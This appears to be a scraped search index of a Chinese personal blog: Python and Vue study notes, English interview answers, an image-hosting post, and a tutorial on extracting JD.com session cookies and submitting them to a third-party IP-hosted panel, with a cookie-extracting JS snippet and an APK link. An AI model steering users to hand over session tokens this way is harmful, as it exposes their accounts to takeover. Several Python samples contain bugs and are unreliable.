笔记","uri":"/posts/python%E7%AC%94%E8%AE%B0/#面向对象编程"},{"categories":["学习笔记"],"content":"\r面向对象进阶","date":"2022-06-06","objectID":"/posts/python%E7%AC%94%E8%AE%B0/:4:0","series":null,"tags":null,"title":"Python-Day-100 笔记","uri":"/posts/python%E7%AC%94%E8%AE%B0/#面向对象进阶"},{"categories":["学习笔记"],"content":"\r@property装饰器之前讲过的使用单下划线标识变量为私有的，不建议外界直接访问，如果想访问可以使用 @property装饰器 可以用来包装getter和setter方法 python class Person(object): def __init__(self,name,age): self.name = name self.age = age @property def name(self): return self.name @property def age(self): return self.age @age.setter def age(self,age): self.age = age #没有定义name的setter方法，如果访问的话会报AttributeError: can't set attribute错误\r","date":"2022-06-06","objectID":"/posts/python%E7%AC%94%E8%AE%B0/:4:1","series":null,"tags":null,"title":"Python-Day-100 笔记","uri":"/posts/python%E7%AC%94%E8%AE%B0/#property装饰器"},{"categories":["学习笔记"],"content":"\r__ slots __魔法由于Python是一种动态语言，允许在程序运行中给对象或属性绑定新的方法和属性，可以使用__slots__魔法来限定类可以绑定的属性和方法。 __slots__是一个变量，英文名直接翻译过来的意思是插槽，可以理解为在其中的方法或属性规定为类可拥有的 python class Person(object): __slots__ = ('_name', '_age', '_gender') def __init__(self,name,age): self.name = name self.age = age @property def name(self): return self.name @property def age(self): return self.age @age.setter def age(self,age): self.age = age #如果添加或设置不在__slots__包含的属性，如'_is_man'则会报错AttributeError: 'Person' object has no attribute '_is_man'\r","date":"2022-06-06","objectID":"/posts/python%E7%AC%94%E8%AE%B0/:4:2","series":null,"tags":null,"title":"Python-Day-100 笔记","uri":"/posts/python%E7%AC%94%E8%AE%B0/#__-slots-__魔法"},{"categories":["学习笔记"],"content":"\r静态方法和类方法类中的方法不一定都是对象方法（给类对象传递消息），也有一些通用的静态方法，如：三角形类中还为创建对象之前需要判断三条边是否能组成三角形，判断边能否组成三角形就可以设置为静态方法。类方法个人理解类似于Java中的默认构造方法。 静态方法使用@staticmethod装饰器，举例： python class Triangle(object): def __init__(self, a, b, c): self._a = a self._b = b self._c = c @staticmethod def is_valid(a, b, c): return a + b \u003e c and b + c \u003e a and a + c \u003e b def main(): #静态方法 a,b,c = 6,8,10 if Triangle.is_valid(a, b, c): print(\"构成三角形\") if __name == '__main__': main()\r类方法使用@classmethod装饰器，类方法的第一个参数约定名为cls参数，它代表的是当前类相关的信息的对象，举例： python class Clock(object): \"\"\"数字时钟\"\"\" def __init__(self, hour=0, minute=0, second=0): self._hour = hour self._minute = minute self._second = second @classmethod def now(cls): ctime = localtime(time()) return cls(ctime.tm_hour, ctime.tm_min, ctime.tm_sec) def show(self): \"\"\"显示时间\"\"\" return '%02d:%02d:%02d' % \\ (self._hour, self._minute, self._second) def main(): clock = Clock.now() clock.show() if __name == '__main__': main()\r","date":"2022-06-06","objectID":"/posts/python%E7%AC%94%E8%AE%B0/:4:3","series":null,"tags":null,"title":"Python-Day-100 笔记","uri":"/posts/python%E7%AC%94%E8%AE%B0/#静态方法和类方法"},{"categories":["学习笔记"],"content":"\r类之间的关系类之间的关系主要有三种：is-a、has-a和use-a关系 is-a关系。通常称为继承或者泛化，如学生和人的关系，狗和宠物的关系。 has-a关系。通常称为关联，如部门和公司、汽车和引擎的关系。 关联关系如果是整体和部分的关联，则称这种关联为聚合关系 如果整体负责了部分的生命周期（比如我和我的脑子）整体和部分是不可分割的，整体的生命周期结束就表示部分的生命周期结束，这种关联是最强的关联关系，称为强聚合或者组合关系 use-a关系。称为依赖关系，表示一个类依赖于顶一个类的定义，依赖关系总是单向的。比如某人要过河，需要借用一条船，此时人与船之间的关系就是依赖。 这些都属于UML（统一建模语言）用来描述对象之间的关系。参考内容：UML的四种关系。还可以去看《UML面向对象设计基础》一书 ","date":"2022-06-06","objectID":"/posts/python%E7%AC%94%E8%AE%B0/:4:4","series":null,"tags":null,"title":"Python-Day-100 笔记","uri":"/posts/python%E7%AC%94%E8%AE%B0/#类之间的关系"},{"categories":["学习笔记"],"content":"\r继承和多态我们可以在已有的类的基础之上建立新的类，可以直接将原有类中的属性和方法继承下来，从而减少重复代码。继承中有两个概念： 父类。也成超类、基类，是提供类继承信息的类 子类。也成派生类、衍生类，是得到继承信息的类 子类除了可以继承父类中的属性和方法，还可以定义自己新的属性和方法，所以子类的功能也会更全面。在开发中也经常使用子类替换父类对象，这一规则称为里氏替换原则。 继承的例子： python class Person(object): def __init__(self, name, age): self._name = name self._age = age \"\"\" 省略setter和getter方法 \"\"\" class Student(Person): def __init__(self, name, age, grade): super().__init__(name, age)#调用父类的初始化方法 self._grade = grade\r子类继承父类方法以后，可以对父类已经实现的方法重新构造，这种行为称为方法重写（override）。通过重写父类的方法，可以使得不同的子类拥有不同的行为，这就是所谓的多态。 python from abc import ABCMeta, abstractmethod class Pet(object, metaclass=ABCMeta): \"\"\"宠物\"\"\" def __init__(self, nickname): self._nickname = nickname @abstractmethod def make_voice(self): \"\"\"发出声音\"\"\" pass class Dog(Pet): def make_voice(self): print('%s: 汪汪汪...' % self._nickname) class Cat(Pet): def make_voice(self): print('%s: 喵...喵...' % self._nickname)\r在上面代码中，创建了 Pet 抽象类，抽象类就是不能够被创建成对象的类，它是专门用来让其他类继承它。Python中没有Java那样对抽象类的支持，但是可以使用 abc 模块的 ABCMeta 元类和 abstractmethod 包装器来达到抽象类的效果。Dog 和 Cat 类分别继承了抽象类 Pet 并重写了 make_voice 方法，当分别创建两个对象并调用方法时，这个方法就表现出了多态行为。 ","date":"2022-06-06","objectID":"/posts/python%E7%AC%94%E8%AE%B0/:4:5","series":null,"tags":null,"title":"Python-Day-100 笔记","uri":"/posts/python%E7%AC%94%E8%AE%B0/#继承和多态"},{"categories":["学习笔记"],"content":"\r文件和异常开发中经常需要将数据持久化存储，最简单的方式就是存到文件中，Python可以使用 open 函数，指定文件名、操作模式、编码信息等获取到操作文件的对象。具体的操作模式如下表 操作模式 具体含义 'r' 读取 （默认） 'w' 写入（会先截断之前的内容） 'x' 写入，如果文件已经存在会产生异常 'a' 追加，将内容写入到已有文件的末尾 'b' 二进制模式 't' 文本模式（默认） '+' 更新（既可以读又可以写） 下图是来自菜鸟教程中的辅助图记。 ","date":"2022-06-06","objectID":"/posts/python%E7%AC%94%E8%AE%B0/:5:0","series":null,"tags":null,"title":"Python-Day-100 笔记","uri":"/posts/python%E7%AC%94%E8%AE%B0/#文件和异常"},{"categories":["学习笔记"],"content":"\r读写文本文件读取文件时使用 r 操作模式即可，encoding 参数可以指定编码（若未指定，默认值是None，读取时会使用系统默认编码），如果编码不一致会无法解码导致读取失败。读取文件时会遇到各种错误如：文件找不到会引发 FileNotFoundError，指定了未知的编码会引发 LookupError，而如果读取文件时无法按指定方式解码会引发 UnicodeDecodeError，可以使用 try-except 代码块捕获异常 python def main(): f = None try: f = open('致橡树.txt', 'r', encoding='utf-8') print(f.read()) except FileNotFoundError: print('无法打开指定的文件!') except LookupError: print('指定了未知的编码!') except UnicodeDecodeError: print('读取文件时解码错误!') finally: if f: f.close() if __name__ == '__main__': main()\rtry-except 代码块最后可以使用 finally 块执行外部资源的释放的操作，因为在它其中的代码，不论程序正常还是异常执行都会被执行，即使是 sys 的 exit 函数都会被执行，因为 exit 函数实质上是引发了 SystemExit 异常。 除了 finally 块来执行外部资源的释放以外，还可以使用 with 关键字指定文件对象的上下文环境并在离开上下文环境时自动释放文件资源。 python with open('致橡树.txt', 'r', encoding='utf-8') as f: print(f.read())\r除了使用 read 方法读取文件内容以外，还可以使用 for-in 循环逐行读取或是 readlines 将文件按行读取到一个列表容器中。 python with open('致橡树.txt', 'r', encoding='utf-8') as f: print(f.read()) ith open('致橡树.txt', mode='r') as f: for line in f: print(line, end='') with open('致橡树.txt') as f: lines = f.readlines() print(lines)\r如果想要写入文件可以使用 w 操作模式，但是其会覆盖文件原来的内容，如果想要追加内容可以使用 a 操作模式 ","date":"2022-06-06","objectID":"/posts/python%E7%AC%94%E8%AE%B0/:5:1","series":null,"tags":null,"title":"Python-Day-100 笔记","uri":"/posts/python%E7%AC%94%E8%AE%B0/#读写文本文件"},{"categories":["学习笔记"],"content":"\r读写二进制文件二进制文件常见的有图片的复制或写入图片内容，需要使用二进制模式 b，可以接合读或写模式为 rb 、wb。 ","date":"2022-06-06","objectID":"/posts/python%E7%AC%94%E8%AE%B0/:5:2","series":null,"tags":null,"title":"Python-Day-100 笔记","uri":"/posts/python%E7%AC%94%E8%AE%B0/#读写二进制文件"},{"categories":["学习笔记"],"content":"\r读写JSON文件一个JSON数据类型和Python数据类型的对照表 JSON Python object dict array list string str number (int / real) int / float true / false True / False null None Python 中的 json 模块包含了对 JSON 格式字串操作的函数，分别是： dump - 将 Python 对象按照 JSON 格式序列化到文件中 dumps - 将 Python 对象序列化为 JSON 格式字串 load - 和 dump 相反。(将文件中的 JSON 数据反序列化为 Python 对象) loads -和 dumps相反。（将字符串的内容反序列化成Python对象） python mydict = { \"tieba\":{ \"type\": \"image\", \"container\": [ { \"icon\": \"\u003c img src =\\\"emoji/tieba/呵呵.png\\\"\u003e\", \"text\": \"呵呵\" }, { \"icon\": \"\u003c img src =\\\"emoji/tieba/哈哈.png\\\"\u003e\", \"text\": \"哈哈\" } ] } } with open('data.json', 'w', encoding='utf-8') as fs: json.dump(mydict, fs)\r留个异常的坑以后来填。总结：Python中的异常处理 ","date":"2022-06-06","objectID":"/posts/python%E7%AC%94%E8%AE%B0/:5:3","series":null,"tags":null,"title":"Python-Day-100 笔记","uri":"/posts/python%E7%AC%94%E8%AE%B0/#读写json文件"},{"categories":["瞎折腾"],"content":"获取京东CK(cookie)并提交到上车面板。教程分为不啰嗦版本和详细版本。 提交的cookie的格式为：pt_key=XXX; pt_pin=XXX; CK提交地址：http://42.192.83.222:2332 ","date":"2022-05-09","objectID":"/posts/play_time/%E8%8E%B7%E5%8F%96%E4%BA%AC%E4%B8%9Cck/:0:0","series":null,"tags":["京东薅羊毛"],"title":"获取京东CK教程","uri":"/posts/play_time/%E8%8E%B7%E5%8F%96%E4%BA%AC%E4%B8%9Cck/#"},{"categories":["瞎折腾"],"content":"\r最新方式（看这个！！）访问http://jd.braindance.top，使用手机验证码登陆，系统自动添加、更新失效cookie，登陆成功以后扫码关注通知应用。 ","date":"2022-05-09","objectID":"/posts/play_time/%E8%8E%B7%E5%8F%96%E4%BA%AC%E4%B8%9Cck/:1:0","series":null,"tags":["京东薅羊毛"],"title":"获取京东CK教程","uri":"/posts/play_time/%E8%8E%B7%E5%8F%96%E4%BA%AC%E4%B8%9Cck/#最新方式看这个"},{"categories":["瞎折腾"],"content":"\r不啰嗦版本 多快好省，购物上京东！登录，验证码能通过的！！实在折磨请用下面Android方法 如果你要登陆多个号请使用浏览器无痕模式（谷歌浏览器快捷键Ctrl+Shift+N），不要退出登录！！不要退出登录！！不要退出登录！！退出登录会使cookie失效！！抓完直接关掉再打开个无痕即可 F12打开开发者工具。按照以下步骤抓CK 获取一对一通知(点我跳转)UID进行通知，可以多个账号对应一个UID，自行琢磨。晚上21.30消息通知。 在页面中第一行提交CK。第二行提交备注格式为备注@@获取的UID 说明一下中间的@@不能去掉，是分隔符。备注是用来标注你的哪个京东号，比如小号1@@UUUIIIIDDDD1、小号2@UUUIIIDDD2。 如果在操作中遇到其他问题，看看详细版本。 ","date":"2022-05-09","objectID":"/posts/play_time/%E8%8E%B7%E5%8F%96%E4%BA%AC%E4%B8%9Cck/:2:0","series":null,"tags":["京东薅羊毛"],"title":"获取京东CK教程","uri":"/posts/play_time/%E8%8E%B7%E5%8F%96%E4%BA%AC%E4%B8%9Cck/#不啰嗦版本"},{"categories":["瞎折腾"],"content":"\r详细版本","date":"2022-05-09","objectID":"/posts/play_time/%E8%8E%B7%E5%8F%96%E4%BA%AC%E4%B8%9Cck/:3:0","series":null,"tags":["京东薅羊毛"],"title":"获取京东CK教程","uri":"/posts/play_time/%E8%8E%B7%E5%8F%96%E4%BA%AC%E4%B8%9Cck/#详细版本"},{"categories":["瞎折腾"],"content":"\rPC端获取CK登陆地址：多快好省，购物上京东！ 首先告知。 如果你有多个号登陆，请使用浏览器的无痕浏览，或是更换浏览器抓取，因为京东的cookie在登出以后就会失效。 使用无痕浏览登陆抓完直接关闭，再打开新的无痕浏览抓下一个。 京东cookie手机登陆方式有效期为一个月左右。 输入手机号，获取验证码登陆。如果是手势验证码，失败很多次别灰心，手稳一点，是可以验证通过的。 登陆成功以后 按F12打开开发者工具选择Network（网络），请注意要拦截所有的请求（只要能找到cookie就可），在下方Name（名称）里随便选一个找有完整cookie的。在右边header（标头）下的cookie中找到如pt_key=XXX; pt_pin=XXX;格式的就是需要的cookie。 如果你的名称列表里面是空的，随便点一个页面中的其他按钮，浏览器就会捕获请求 然后在http://42.192.83.222:2332中提交CK，服务器建议腾讯云，变量组为JD_COOKIE，备注可以选择下方的一对一通知方式，CK失效的时候我会根据这个通知你，或者你自己记得一个月要来提交一次。 完工。 补充：如果不想在一堆cookie里找需要的那两个，可以把cookie完全复制下来。然后按F12开发者工具的控制台（console）中执行以下代码： js var CV = '这里面放你拿到的完整cookie'; var CookieValue = CV.match(/pt_key=.+?;/) + CV.match(/pt_pin=.+?;/); console.log(CookieValue) copy(CookieValue);\r控制台里有输出就算成功了，会直接复制到剪切板。 如果看不懂我说的，看看这篇文章方法更全：https://w37fhy.cn/2379.html ","date":"2022-05-09","objectID":"/posts/play_time/%E8%8E%B7%E5%8F%96%E4%BA%AC%E4%B8%9Cck/:3:1","series":null,"tags":["京东薅羊毛"],"title":"获取京东CK教程","uri":"/posts/play_time/%E8%8E%B7%E5%8F%96%E4%BA%AC%E4%B8%9Cck/#pc端获取ck"},{"categories":["瞎折腾"],"content":"\rAndroid手机端获取CK下载apk：https://www.aliyundrive.com/s/rbjgkpBY9eb 打开以后直接登陆，登陆完成以后会直接弹出抓取结果，然后复制CK提交到网页http://42.192.83.222:2332中，别忘了备注。 完工。 ","date":"2022-05-09","objectID":"/posts/play_time/%E8%8E%B7%E5%8F%96%E4%BA%AC%E4%B8%9Cck/:3:2","series":null,"tags":["京东薅羊毛"],"title":"获取京东CK教程","uri":"/posts/play_time/%E8%8E%B7%E5%8F%96%E4%BA%AC%E4%B8%9Cck/#android手机端获取ck"},{"categories":["瞎折腾"],"content":"\r一对一通知可以每天看自己的资产，有商品领取提醒，cookie失效的时候可以及时收到通知。 以下内容使用微信打开，或者复制到浏览器打开（里面虽然是二维码，但是会动态刷新，所以自行打开） //wxpusher.zjiecode.com/api/qrcode/cLY05MLHiHj7JXD7sXMjISKV5C85yhgGDupknmwqFevgvPGzS1xpiiRj0LCX8Xtj.jpg 关注微信公众号 扫码关注以后，提示已经订阅应用京东，然后点击下面我的—\u003e我的UID，会返回你唯一的UID，我只能通过这个UID来通知你你的账号信息。请提交的时候附上备注，格式如备注@@获取的UID。 如果觉得我说的很啰嗦就是因为最近在写毕业论文，废话文学了属于是。 ","date":"2022-05-09","objectID":"/posts/play_time/%E8%8E%B7%E5%8F%96%E4%BA%AC%E4%B8%9Cck/:4:0","series":null,"tags":["京东薅羊毛"],"title":"获取京东CK教程","uri":"/posts/play_time/%E8%8E%B7%E5%8F%96%E4%BA%AC%E4%B8%9Cck/#一对一通知"},{"categories":["瞎折腾"],"content":"\r起因原来博客的图片使用Jsdelivr和github的方式存储访问，但是最近Jsdelivr频繁的被墙，感觉可能在未来的不久会失效，毕竟好多人用来当免费的CDN（比如我），也会有人使用其访问些zz敏感或其他的文件，被墙了也情有可原，而且github的仓库的作用也是用来存储代码而非图床，像我这样的人也导致了仓库的滥用，所以决定找个新的途径。 ","date":"2022-05-01","objectID":"/posts/play_time/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E5%BA%8A%E8%BF%81%E7%A7%BB/:1:0","series":null,"tags":["图床"],"title":"博客图床迁移","uri":"/posts/play_time/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E5%BA%8A%E8%BF%81%E7%A7%BB/#起因"},{"categories":["瞎折腾"],"content":"\r过程当时在网上找了好久，最后在loc上找到了 一个帖子，感觉把目前行得通的方法都列出来了。 一、第三方存储 github+jsdelivr 或 gitee 可以搭配PicGo使用 茎肛互撸娃大佬的鸡霸图床 国内对象存储 使用Onedrive 或 Google Drive 搭建图床 二、自行搭建 （腾讯云轻量香港 or CDN） 反代 （本地 or 大盘鸡） 北岸域名+国内机器 国内机器非标准端口 家宽开通公网IP存在家里 三、直接嵌在文档中，图片转base64，markdown插入 最后我是选择了良心云的cos对象存储，新用户第一年便宜，就算以后续费一年差不多也70左右。之前自己有了解过对象存储这一技术，但是当时听闻的是有人被套路云的流量计费给掏空了，这次在良心云的计费方式中找到了按量计费，这也刚好满足了博客图片也不多的需求，更不怕被人把钱包给刷爆了。 上传的方式还是配合PicGo上传，又添加了一个rename-file插件实现上传路径的命名。因为感觉对象存储给的链接太长，国内没有备案的域名，使用了一个服务器直接域名重定向到对象存储给的域名。 ","date":"2022-05-01","objectID":"/posts/play_time/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E5%BA%8A%E8%BF%81%E7%A7%BB/:2:0","series":null,"tags":["图床"],"title":"博客图床迁移","uri":"/posts/play_time/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E5%BA%8A%E8%BF%81%E7%A7%BB/#过程"},{"categories":["瞎折腾"],"content":"\r结果宣布从这篇文章开始往后的图片都会用对象存储，之前的文章如果有需要评论或者联系我再补上吧。 ","date":"2022-05-01","objectID":"/posts/play_time/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E5%BA%8A%E8%BF%81%E7%A7%BB/:3:0","series":null,"tags":["图床"],"title":"博客图床迁移","uri":"/posts/play_time/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E5%BA%8A%E8%BF%81%E7%A7%BB/#结果"},{"categories":["瞎折腾"],"content":"\r插曲（避坑）期间使用对象存储测试图片的时候，发现过一阵子图片就访问不了了，去桶里一看发现空空如也，发生了两次清空也不知道啥原因，最后一次点了下清空存储桶，发现使用方式里有个生命周期管理，发现是这玩意自动删除文件，所以记得把生命周期规则修改一下。 ","date":"2022-05-01","objectID":"/posts/play_time/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E5%BA%8A%E8%BF%81%E7%A7%BB/:3:1","series":null,"tags":["图床"],"title":"博客图床迁移","uri":"/posts/play_time/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E5%BA%8A%E8%BF%81%E7%A7%BB/#插曲避坑"},{"categories":null,"content":"\rPlease introduce yourself​ Good morning/afternoon/,dear teachers/professors! It’s my great honor to be here for this interview. My name is XXX, 22 years old and I come from Luoyang, a city with a long history, I am a senior student in Zhongyuan University of Technology, and my major is software engineering. ​ After entering the University, I have always maintained curiosity and enthusiasm for all kinds of new knowledge. Although I have never been in contact with programming, I found its charm in a period of study. During my freshman year, I entered the excellent class established by the school because of my outstanding grades in the examination. I also took part in many competition for professional skills held in our school, which stimulated [ˈstɪmjuleɪtɪd] my academic passion. When I was a junior, my teammates and I participated in the national college student information security contest, and won the third National Prize, which not only strengthened our friendship, but also deepened our professional knowledge. ​ Next, I want to talk about my future plans. I chose to apply for your school because it has a large number of professional teachers for my dream major and enjoys a high reputation. I hope I can have a more systematic and professional understanding of it through three years of study, and contribute more research results to this field out of my work. ​ If I am admitted, I will be very delighted and honored. The above is my self-introduction. Thank you ","date":"2022-04-04","objectID":"/posts/%E8%8B%B1%E8%AF%AD%E9%97%AE%E7%AD%94/:0:0","series":null,"tags":null,"title":"英语问答","uri":"/posts/%E8%8B%B1%E8%AF%AD%E9%97%AE%E7%AD%94/#please-introduce-yourself"},{"categories":null,"content":"\rWhat are you interested in?I have been passionate about reading since I was a child. I love reading because reading exposes me many kinds of excellent works and allows me to learn many valuable qualities from different characters. I think these qualities can make me more decisive[dɪˈsaɪsɪv] in facing challenges. Even if sometimes I am busy with my studies, I will still insist on reading. I believe reading would be my lifelong hobby. ","date":"2022-04-04","objectID":"/posts/%E8%8B%B1%E8%AF%AD%E9%97%AE%E7%AD%94/:0:0","series":null,"tags":null,"title":"英语问答","uri":"/posts/%E8%8B%B1%E8%AF%AD%E9%97%AE%E7%AD%94/#what-are-you-interested-in"},{"categories":null,"content":"\rWhat is your favorite book?My favorite book is Water Margin written by Shi Naian. This book mainly describes the great story of Liangshan hero’s resistance to oppression [əˈpreʃn], Finally, with Song Jiang being recruited by the imperial[ɪmˈpɪəriəl] court, the uprising[ˈʌpraɪzɪŋ] ended in failure. ","date":"2022-04-04","objectID":"/posts/%E8%8B%B1%E8%AF%AD%E9%97%AE%E7%AD%94/:0:0","series":null,"tags":null,"title":"英语问答","uri":"/posts/%E8%8B%B1%E8%AF%AD%E9%97%AE%E7%AD%94/#what-is-your-favorite-book"},{"categories":null,"content":"\rPlease tell me something about your hometownMy hometown is XXX, I grow up there together with my families and friends. XXX is a small county with beautiful environment, and the scenery there is also really attractive. Another important reason for my fascination [ˌfæsɪˈneɪʃn] with XXX is its slow pace of life. If you have the chance to take a walk with me on the streets of XXX, you would surely fall in love with this county ","date":"2022-04-04","objectID":"/posts/%E8%8B%B1%E8%AF%AD%E9%97%AE%E7%AD%94/:0:0","series":null,"tags":null,"title":"英语问答","uri":"/posts/%E8%8B%B1%E8%AF%AD%E9%97%AE%E7%AD%94/#please-tell-me-something-about-your-hometown"},{"categories":null,"content":"\rPlease give a brief introduction of your collegeMy undergraduate school is Zhongyuan University of Technology. During the past three years, many things in campus has left me deep impressions. Because it is located in the center of Henan, many competitions are often held here, and I also participated in some of them. The learning atmosphere in this University also attracts me very much. I often saw students reciting English words or reading aloud in some corners in the morning. Although many people maybe don’t know much about Zhongyuan University of Technology, it indeed brought me a lot of precious memories and made me who am I now. ","date":"2022-04-04","objectID":"/posts/%E8%8B%B1%E8%AF%AD%E9%97%AE%E7%AD%94/:0:0","series":null,"tags":null,"title":"英语问答","uri":"/posts/%E8%8B%B1%E8%AF%AD%E9%97%AE%E7%AD%94/#please-give-a-brief-introduction-of-your-college"},{"categories":null,"content":"\rWhy do you choose our university and this majorThe reason why I choose this major of 学校 is very simple: I want to become a excellent programmer after three/two years’ study. I am interested in this field because after learning computer programming I can write some software to help myself or others in daily work I majored in Software engineering now, spent almost four years to learn the basic knowledge in this field. During my postgraduate period, I hope to equip myself more practical skills thought the three/two year’s study. ","date":"2022-04-04","objectID":"/posts/%E8%8B%B1%E8%AF%AD%E9%97%AE%E7%AD%94/:0:0","series":null,"tags":null,"title":"英语问答","uri":"/posts/%E8%8B%B1%E8%AF%AD%E9%97%AE%E7%AD%94/#why-do-you-choose-our-university-and-this-major"},{"categories":null,"content":"\rCan you talk about your plans in the postgraduate study？If I am luckily admitted, I will achieve the following goals during the next three/two -year study. First of all, I will try my best to finish all the courses for my graduation, pass all the exam and get all the credits[ˈkredɪts] in the first year. Then, in the second year, I am going to start reading papers and periodicals[ˌpɪəriˈɒdɪkl] as well as doing some academic research with the seniors and my mentor. At last I will finish my graduation thesis[ˈθiːsɪs] in third year, take part in interships, and prepare for my future employment. I believe my post-graduate life would be enriched and meaningful. ","date":"2022-04-04","objectID":"/posts/%E8%8B%B1%E8%AF%AD%E9%97%AE%E7%AD%94/:0:0","series":null,"tags":null,"title":"英语问答","uri":"/posts/%E8%8B%B1%E8%AF%AD%E9%97%AE%E7%AD%94/#can-you-talk-about-your-plans-in-the-postgraduate-study"},{"categories":null,"content":"\rTell us something about your family.There are four members in my family : my father , mother , my sister and me. Father is a reporter , and my mother is a teacher. My sister is a doctoral student in a school .I love my parents so much , they give me whatever they have . more importantly, they give me their love and support without a request of return. I am so lucky to grow in such a family with love. ","date":"2022-04-04","objectID":"/posts/%E8%8B%B1%E8%AF%AD%E9%97%AE%E7%AD%94/:0:0","series":null,"tags":null,"title":"英语问答","uri":"/posts/%E8%8B%B1%E8%AF%AD%E9%97%AE%E7%AD%94/#tell-us-something-about-your-family"},{"categories":null,"content":"\r杂句子口语has a long history of studying computer technology ","date":"2022-04-04","objectID":"/posts/%E8%8B%B1%E8%AF%AD%E9%97%AE%E7%AD%94/:0:0","series":null,"tags":null,"title":"英语问答","uri":"/posts/%E8%8B%B1%E8%AF%AD%E9%97%AE%E7%AD%94/#杂句子口语"},{"categories":null,"content":"\r理解MVVMVue参考的MVVM模型 M：模型(Model) ：data中的数据 V：视图(View) ：模板代码 VM：视图模型(ViewModel)：Vue实例 观察发现： data中所有的属性，最后都出现在了vm身上。 vm身上所有的属性及Vue原型上所有属性，在Vue模板中都可以直接使用。 ","date":"2022-03-07","objectID":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:0","series":null,"tags":null,"title":"Vue学习笔记","uri":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#理解mvvm"},{"categories":null,"content":"\r数据代理","date":"2022-03-07","objectID":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:2:0","series":null,"tags":null,"title":"Vue学习笔记","uri":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#数据代理"},{"categories":null,"content":"\r回顾Object.defineProperty方法\rvue let number = 18 object.defineProperty(person,'age',{ value:18, enumerable:true，//控制属性是否可以枚举，默认值是false writable:true，//控制属性是否可以被修改，默认值是false configurable:true //控制属性是否可以被删除，默认值是false //当有人读取person的age属性时，get函数（getter)就会被调用，且返回值就是age的值 get(){ return number }, //当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值 set(value){ number = value } })\r","date":"2022-03-07","objectID":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:2:1","series":null,"tags":null,"title":"Vue学习笔记","uri":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#回顾objectdefineproperty方法"},{"categories":null,"content":"\r数据代理何为数据代理？通过一个对象来修改另一个对象。 例如，obj={x:100} obj2={y:200} 使用Object.defineProperty方法，设置obj2的x属性get和set方法与obj绑定 vue Object.defineProperty(obj2,'x',{ get(){ return obj.x }, set(value){ obj.x = value } })\r在script标签里设置的data属性值，绑定的是vm中的_data属性 Vue中的数据代理： 通过vm对象来代理data对象中属性的操作（读/写） Vue中数据代理的好处： 更加方便的操作data中的数据 基本原理： 通过0bject.defineProperty()把data对象中所有属性添加到vm上。为每一个添加到vm上的属性，都指定一个getter/setter。在getter/setter内部去操作（读/写）data中对应的属性。 ","date":"2022-03-07","objectID":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:2:2","series":null,"tags":null,"title":"Vue学习笔记","uri":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#数据代理-1"},{"categories":null,"content":"\r事件处理事件的基本使用： 使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名； 事件的回调需要配置在methods对象中，最终会在vm上； methods中配置的函数，不要用箭头函数！否则this就不是vm了； methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象； @click=“demo” 和 @click=“demo($event)“效果一致，但后者可以传参； @click=“yyy”，其中yyy可以写一些简单的语句 ","date":"2022-03-07","objectID":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:0","series":null,"tags":null,"title":"Vue学习笔记","uri":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#事件处理"},{"categories":null,"content":"\r事件修饰符使用示例 html \u003ca href=\"xxx\" @click.prevent=\"showInfo\"\u003e\revent事件中可以使用e.preventDefault()阻止默认事件，vue中可以使用@click.prevent=‘xxx’的修饰方式使用该方法。 扫盲： 事件冒泡 ：当一个元素接收到事件的时候 会把他接收到的事件传给自己的父级，一直到window 。（注意这里传递的仅仅是事件 并不传递所绑定的事件函数。所以如果父级没有绑定事件函数，就算传递了事件 也不会有什么表现 但事件确实传递了。） 事件捕获和事件冒泡：DOM2级事件’规定的事件流包含3个阶段，事件捕获阶段、处于目标阶段、事件冒泡阶段。首先发生的事件捕获为截获事件提供机会，然后是实际的目标接收事件，最后一个阶段是事件冒泡阶段，可以在这个阶段对事件做出响应。https://www.cnblogs.com/christineqing/p/7607113.html Vue中的事件修饰符： 1.prevent：阻止默认事件（常用）； 2.stop：阻止事件冒泡（常用）； 3.once：事件只触发一次（常用）； 4.capture：使用事件的捕获模式（捕获阶段就执行函数）； 5.self：只有event.target是当前操作的元素时才触发事件； 6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕（比如scroll和wheel事件，wheel回调函数很麻烦的时候，可以使用passive优先执行滚轮默认行为）； ","date":"2022-03-07","objectID":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:4:0","series":null,"tags":null,"title":"Vue学习笔记","uri":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#事件修饰符"},{"categories":null,"content":"\r键盘事件使用方法示例 vue \u003cinput @keydown.enter=\"showInfo\"\u003e\rVue中常用的按键别名： 回车 =\u003e enter 删除 =\u003e delete（捕获“删除”和“退格） 退出 =\u003e esc 空格 =\u003e space 换行 =\u003e tab（特殊，必须配合keydown去使用） 上 =\u003e up 下 =\u003e down 左 =\u003e left 右 =\u003e right Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要keyab-case（驼峰命名改为短横线命名） 系统修饰键（用法特殊）：ctrl、alt、shift、meta 配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。 配合keydown使用：正常触发事件。 也可以使用keyCode去指定具体的按键（不推荐） Vue.config.keyCodes.自定义键名 = 键去定制按键别名 